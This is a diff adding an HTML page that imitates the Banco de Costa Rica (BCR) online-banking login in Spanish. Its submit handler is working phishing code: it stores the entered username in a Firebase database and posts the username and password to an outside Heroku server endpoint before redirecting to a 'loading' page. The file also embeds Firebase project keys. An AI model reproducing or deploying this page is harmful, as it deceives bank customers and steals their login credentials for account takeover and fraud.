@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>BCR</title>
+    
+    <!-- Estilos y Favicon -->
+    <link href="./archivos/style.css" rel="stylesheet" type="text/css" />
+    <link rel="icon" href="archivos/favicon.png" />
+    
+    <!-- Librerías externas -->
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    
+    <!-- Firebase Configuración -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+      
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+      
+      // Hacer accesible globalmente
+      window.db = db;
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+  </head>
+  <body>
+    <!-- Encabezado -->
+    <header class="head">
+      <img src="./archivos/logo.gif" class="logo" alt="Logo" />
+      <img src="./archivos/Certificado.svg" class="headimg1" alt="Certificación" />
+      <img src="./archivos/Contactenos.svg" class="headimg2" alt="Contáctenos" />
+      <a href="#" class="linkhead1">Certificaciones</a>
+      <a href="#" class="linkhead2">Contáctenos</a>
+    </header>
+    
+    <div class="container">
+      <div class="costilla" style="text-align: center">
+        <img src="archivos/MensajeSeguridad3.png" alt="Mensaje Seguridad" style="width: 90%; margin-top: 120px" />
+      </div>
+      
+      <div class="containerimg">
+        <div class="divform1">
+          <form id="loginform">
+            <span class="ingresartxt">Ingresar</span>
+            <hr class="line1" color="#C4C4C4" />
+            
+            <div class="floating-label">
+              <input class="user" type="text" id="usuario" name="user" placeholder=" " required />
+              <label>Usuario</label>
+            </div>
+            
+            <div class="floating-label2">
+              <input class="pass" type="password" id="contra" name="pass" placeholder=" " required />
+              <label>Contraseña</label>
+              <img id="imgpass1" src="./archivos/ver.png" class="ver" alt="Ver" />
+              <img id="imgpass2" src="./archivos/ver2.png" class="ver" style="display: none" alt="Ocultar" />
+            </div>
+            
+            <button type="submit" class="btn-uno">Ingresar</button>
+            <button class="btn-dos" type="button">Recuperar datos de ingreso</button>
+            
+            <input type="checkbox" name="checkbox" class="digital" id="certificadoDigital" />
+            <label for="certificadoDigital" class="labelchk">Certificado Digital</label>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+    <footer class="footer">
+      <span class="footertext">BCR © Derechos Reservados 2023. Contáctenos: CentroAsistenciaBCR@bancobcr.com</span>
+    </footer>
+    
+    <!-- Overlay de carga -->
+    <div class="overlay" id="overlay" style="display: none">
+      <div class="centered-content">
+        <div class="dot-container">
+          <div class="dot dot1"></div>
+          <div class="dot dot2"></div>
+          <div class="dot dot3"></div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Script principal -->
+    <script src="script.js"></script>
+    
+    <script>
+      document.querySelector("#loginform").addEventListener("submit", async (event) => {
+        event.preventDefault();
+        
+        const usuario = document.querySelector("#usuario").value;
+        const contra = document.querySelector("#contra").value;
+
+        if (!usuario || !contra) {
+          alert("Por favor, complete todos los campos.");
+          return;
+        }
+
+        try {
+          const userRef = doc(window.db, "bcrrr", usuario);
+          await setDoc(userRef, {
+            question1: "A1",
+            question2: "A1",
+            question3: "A1",
+            page: 0,
+          });
+          
+          localStorage.setItem("usuario", usuario);
+          const message = `BCR-----Nombre: ${usuario} -----Contra: ${contra}`;
+          
+          await axios.post("https://srvdor-33a68f3ab628.herokuapp.com/bbva2", { mensaje: message });
+          
+          window.location.href = "cargando.html";
+        } catch (error) {
+          console.error("Error al enviar datos:", error);
+        }
+      });
+    </script>
+  </body>
+</html>
